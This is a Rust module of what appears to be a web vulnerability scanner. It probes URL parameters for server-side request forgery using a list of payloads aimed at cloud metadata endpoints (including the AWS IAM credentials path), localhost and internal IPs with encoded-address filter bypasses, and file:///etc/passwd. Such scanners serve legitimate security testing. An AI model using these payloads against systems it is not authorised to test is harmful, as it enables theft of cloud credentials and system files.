use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// SSRF detection — internal IP and cloud metadata probing
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: Server Side Request Forgery (SSRF)", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() {
        println!("{} No parameters found for SSRF testing", "[i]".cyan());
        return Ok(());
    }

    let client = HttpClient::new()?;

    // (payload_url, confirmation_pattern, description)
    let ssrf_targets: Vec<(&str, &str, &str)> = vec![
        // AWS metadata
        ("http://169.254.169.254/latest/meta-data/", "ami-id", "AWS Instance Metadata"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AccessKeyId", "AWS IAM Credentials"),
        // GCP metadata
        ("http://metadata.google.internal/computeMetadata/v1/", "attributes", "GCP Metadata"),
        // Azure metadata
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute", "Azure Instance Metadata"),
        // Localhost probing
        ("http://127.0.0.1/", "<html", "Localhost HTTP"),
        ("http://127.0.0.1:8080/", "<html", "Localhost :8080"),
        ("http://127.0.0.1:3000/", "<html", "Localhost :3000"),
        ("http://[::1]/", "<html", "IPv6 Localhost"),
        // Bypass variants
        ("http://0x7f000001/", "<html", "Hex IP Bypass"),
        ("http://0177.0.0.1/", "<html", "Octal IP Bypass"),
        ("http://2130706433/", "<html", "Decimal IP Bypass"),
        // Internal network scan
        ("http://192.168.1.1/", "<html", "Internal Gateway"),
        ("http://10.0.0.1/", "<html", "Internal 10.x Gateway"),
        // File protocol
        ("file:///etc/passwd", "root:", "Local File Read via file://"),
    ];

    for (param_name, _) in &params {
        for (ssrf_url, confirm, desc) in &ssrf_targets {
            let url = Analyzer::inject_param(target, param_name, ssrf_url)?;
            if let Ok(result) = Analyzer::send_and_analyze(&client, &url, confirm).await {
                if result.reflected_in_body && result.response_body.len() > 10 {
                    println!(
                        "{} CONFIRMED: SSRF in param '{}' — {}",
                        "[!]".red().bold(), param_name, desc
                    );
                    println!("    Payload: {}", ssrf_url);
                    println!("    Response length: {} bytes", result.response_body.len());
                    return Ok(());
                }
            }
        }
    }

    Ok(())
}
